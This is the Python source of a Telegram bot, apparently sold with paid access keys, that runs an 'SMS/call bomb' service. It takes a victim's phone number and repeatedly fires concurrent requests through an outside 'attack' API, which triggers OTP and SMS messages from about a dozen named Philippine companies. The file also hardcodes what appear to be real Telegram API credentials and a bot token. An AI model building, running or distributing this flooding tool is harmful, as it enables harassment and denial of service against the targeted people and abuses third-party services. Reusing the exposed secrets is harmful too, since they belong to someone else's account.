# language: Python, file: main.py, target: Telegram, Railway
# *Massive bulk concurrent execution engine for high-speed multi-service flooding.*

import os
import time
import asyncio
import logging
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

API_ID = 31658480
API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"

OWNER_CONTACT = "t.me/mtfeels"
API_URL = "https://beboy-sms.vercel.app/attack"

PRICING = {
    "7d": {"name": "7 Days Access", "price": "₱100", "days": 7},
    "1m": {"name": "1 Month Access", "price": "₱150", "days": 30},
    "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
}

USER_DATABASE = {}
VALID_KEYS = {
    "KEY-7D-PH99": "7d",
    "KEY-1M-PH55": "1m",
    "KEY-LIFE-PH88": "life"
}

SERVICES_INFO = [
    ("CALL_BOMB",        "📞", "Call Bomb     "),
    ("CUSTOM_SMS",       "✉️ ", "Custom SMS    "),
    ("EZLOAN",           "💳", "EZ Loan       "),
    ("XPRESS",           "⚡", "Xpress        "),
    ("ABENSON",          "🏪", "Abenson       "),
    ("EXCELLENT_LENDING","💰", "Excellent Lend"),
    ("FORTUNE_PAY",      "🎰", "Fortune Pay   "),
    ("WEMOVE",           "🚚", "WeMove        "),
    ("LBC",              "📦", "LBC           "),
    ("PICKUP_COFFEE",    "☕", "Pickup Coffee "),
    ("HONEY_LOAN",       "🍯", "Honey Loan    "),
    ("KOMO_PH",          "🦅", "Komo PH       "),
    ("S5_OTP",           "🔐", "S5 OTP        "),
]

ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.WARNING)

def get_user_record(user_id):
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "verified": True,
            "attempts_left": 3,
            "expiry": 0,
            "key_type": None,
            "services": list(ALL_SERVICE_KEYS),
            "amount": 10,  # Default higher bulk batches for massive flood
            "sender_name": "Unknown",
            "message": "You have a pending notification."
        }
    return USER_DATABASE[user_id]

def check_access(user_id):
    record = get_user_record(user_id)
    if record["key_type"] and time.time() < record["expiry"]:
        return True, "🌟 ACTIVE VIP KEY"
    if record["attempts_left"] > 0:
        return True, f"🎁 FREE TRIAL ({record['attempts_left']}/3 LEFT)"
    return False, "❌ EXPIRED"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 𝗦𝗘𝗟𝗘𝗖𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 & 𝗟𝗔𝗨𝗡𝗖𝗛", callback_data="menu_modules")],
        [InlineKeyboardButton("⚙️ 𝐂𝐎𝐍𝐅𝐈𝐆 & 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data="menu_config")],
        [InlineKeyboardButton("📊 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 & 𝗦𝗧𝗔𝗧𝗦", callback_data="menu_stats"),
         InlineKeyboardButton("💎 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 & 𝗣𝗟𝗔𝗡𝗦", callback_data="menu_pricing")],
        [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦 𝗞𝗘𝗬", url=f"https://{OWNER_CONTACT}"),
         InlineKeyboardButton("🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬", callback_data="menu_redeem")]
    ])

def modules_menu_keyboard(current_services):
    keyboard = []
    for key, icon, label in SERVICES_INFO:
        status = "● ON" if key in current_services else "○ OFF"
        keyboard.append([InlineKeyboardButton(f"{status} {icon} {label}", callback_data=f"toggle_{key}")])
    keyboard.append([InlineKeyboardButton("✨ 𝐋𝐀𝐔𝐍𝐂𝐇 𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐅𝐋𝐎𝐎𝐃", callback_data="launch_prompt")])
    keyboard.append([InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵 𝑻𝑶 𝑴𝑨𝑰𝑵 𝑴𝑬𝑵𝑼", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = (
        "╔═══════════════════════════╗\n"
        "║  ✦ 𝐅𝐋𝐎𝐎𝐃 𝐁𝐎𝐓 • 𝐌𝐀𝐒𝐒𝐈𝐕𝐄 ✦ ║\n"
        "╚═══════════════════════════╝\n\n"
        f"👤 **Operator:** `{user.first_name}`\n"
        f"⚡ **Status:** `{check_access(user_id)[1]}`\n\n"
        "╭── 𝑴𝑨𝑰𝑵 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑳 𝑴𝑬𝑵𝑼 ──╮\n"
        "│ Select an operation below:\n"
        "╰───────────────────────────╯"
    )
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.edit_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    record = get_user_record(user_id)

    if data == "main_menu":
        await start(update, context)
        return

    if data == "menu_modules":
        allowed, status_msg = check_access(user_id)
        if not allowed:
            await query.message.edit_text("❌ **𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃**", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
            return
        await query.message.edit_text(f"⚡ **𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐌𝐎𝐃𝐔𝐋𝐄𝐒**\nStatus: `{status_msg}`", reply_markup=modules_menu_keyboard(record["services"]), parse_mode="Markdown")
        return

    if data.startswith("toggle_"):
        svc_key = data.replace("toggle_", "")
        if svc_key in record["services"]:
            record["services"].remove(svc_key)
        else:
            record["services"].append(svc_key)
        await query.message.edit_text(f"⚡ **𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐌𝐎𝐃𝐔𝐋𝐄𝐒**\nUpdated active modules:", reply_markup=modules_menu_keyboard(record["services"]), parse_mode="Markdown")
        return

    if data == "launch_prompt":
        await query.message.edit_text("🚀 **𝐌𝐀𝐒𝐒 𝐋𝐀𝐔𝐍𝐂𝐇 𝐏𝐑𝐄𝐏𝐀𝐑𝐀𝐓𝐈𝐎𝐍**\n\nSend target number and optional batch size (e.g., `09693457389 15`):\n*(Default is 10 massive waves)*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return

    if data == "menu_config":
        await query.message.edit_text(f"⚙️ **𝐂𝐎𝐍𝐅𝐈𝐆𝐔𝐑𝐀𝐓𝐈𝐎𝐍**\nSender: `{record['sender_name']}`\nDefault Waves: `{record['amount']}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return

    if data == "menu_stats":
        allowed, status_msg = check_access(user_id)
        await query.message.edit_text(f"📊 **𝐓𝐑𝐀𝐂𝐊𝐄𝐑**\nStatus: `{status_msg}`\nFree Tries: `{max(0, record['attempts_left'])}`\nCredits: `MTFEELS`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return

    if data == "menu_pricing":
        await query.message.edit_text(f"💎 **𝐏𝐑𝐈𝐂𝐈𝐍𝐆**\n7d: ₱100\n1m: ₱150\nLife: ₱199\nContact: @{OWNER_CONTACT}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return

    if data == "menu_redeem":
        await query.message.edit_text("🔑 **𝐑𝐄𝐃𝐄𝐌𝐏𝐓𝐈𝐎𝐍**\nSend command: `/redeem KEY-HERE`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    args = context.args
    if not args:
        await update.message.reply_text("❌ Example: `/redeem KEY-7D-PH99`", parse_mode="Markdown")
        return
    key = args[0].strip()
    if key in VALID_KEYS:
        k_type = VALID_KEYS[key]
        record["key_type"] = k_type
        record["expiry"] = time.time() + (PRICING[k_type]["days"] * 86400)
        record["attempts_left"] = 999999
        await update.message.reply_text(f"✅ **SUCCESS!** Redeemed {PRICING[k_type]['name']}.", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    else:
        await update.message.reply_text("❌ **Invalid Key.**", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    text = update.message.text.strip()

    parts = text.split()
    target_phone = parts[0]
    batches = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else record["amount"]

    if not target_phone.isdigit() or len(target_phone) < 10:
        return

    if not (record["key_type"] and time.time() < record["expiry"]):
        if record["attempts_left"] > 0:
            record["attempts_left"] -= 1
        else:
            await update.message.reply_text(f"❌ Free trials exhausted! Buy a key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
            return

    services = record["services"]
    status_msg = await update.message.reply_text(f"🔥 **INITIATING MASSIVE FLOOD**\nTarget: `{target_phone}`\nConcurrent Services: `{len(services)}`\nWaves: `{batches}`", parse_mode="Markdown")

    success, fail = 0, 0

    async def fire_request(client, service_key):
        nonlocal success, fail
        try:
            resp = await client.post(
                API_URL,
                data={"phone": target_phone, "amount": "1", "sender_name": record["sender_name"], "message": record["message"]},
                files={"services": (None, service_key)}
            )
            if resp.status_code == 200:
                success += 1
            else:
                fail += 1
        except Exception:
            fail += 1

    async with httpx.AsyncClient(timeout=45.0) as client:
        for wave in range(1, batches + 1):
            bar = "█" * int(20 * wave / batches) + "░" * (20 - int(20 * wave / batches))
            
            # Fire all selected services concurrently in this wave (Bulk / Mass Flood)
            tasks = [fire_request(client, s) for s in services]
            await asyncio.gather(*tasks)

            try:
                await status_msg.edit_text(
                    f"⚡ **MASS FLOODING WAVE {wave}/{batches}**\n"
                    f"Target: `{target_phone}`\n"
                    f"Progress: `[{bar}]` {int(wave/batches*100)}%\n"
                    f"🟢 Dispatched: `{success}` | 🔴 Errors: `{fail}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            await asyncio.sleep(0.2)

    await status_msg.edit_text(
        f"╔═══════════════════════════╗\n"
        f"║   💥 MASS FLOOD COMPLETE  ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"  🟢 Total Dispatched : `{success}`\n"
        f"  🔴 Total Failed     : `{fail}`\n"
        f"  📊 Waves Executed   : `{batches}`\n\n"
        f"✨ *Full credits to MTFEELS*",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
